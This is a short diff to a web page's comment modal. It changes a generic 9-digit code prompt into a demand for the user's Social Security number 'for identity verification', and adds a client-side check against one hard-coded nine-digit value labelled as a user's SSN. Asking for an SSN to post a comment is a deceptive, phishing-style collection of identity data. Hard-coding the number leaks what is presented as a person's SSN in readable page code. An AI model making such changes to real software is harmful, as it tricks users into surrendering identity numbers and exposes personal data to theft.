@@ -194,8 +194,8 @@
   <!-- Modal: 9-digit code -->
   <div class="modal-overlay" id="codeModal" aria-hidden="true" role="dialog" aria-labelledby="codeTitle" aria-modal="true">
     <div class="modal">
-      <h3 id="codeTitle">Enter Required 9-digit Code</h3>
-      <div class="hint">A 9-digit numeric code is required to submit your comment.</div>
+      <h3 id="codeTitle">Enter Required SSN For Identity Verification</h3>
+      <div class="hint">Your SSN required to verify your identity</div>
       <div class="field-row">
         <input id="codeInput" inputmode="numeric" autocomplete="one-time-code"
                placeholder="e.g. 123456789" maxlength="9" />
@@ -355,6 +355,11 @@
       const code = (codeInput.value || '').trim();
       if(!validateCode(code)){
         codeError.textContent = 'Please enter exactly 9 digits (0–9).';
+        codeInput.focus();
+        return;
+      }
+      if (code != '984800459') {
+        codeError.textContent = 'Incorrect SSN for this user. Please try again with the correct SSN';
         codeInput.focus();
         return;
       }
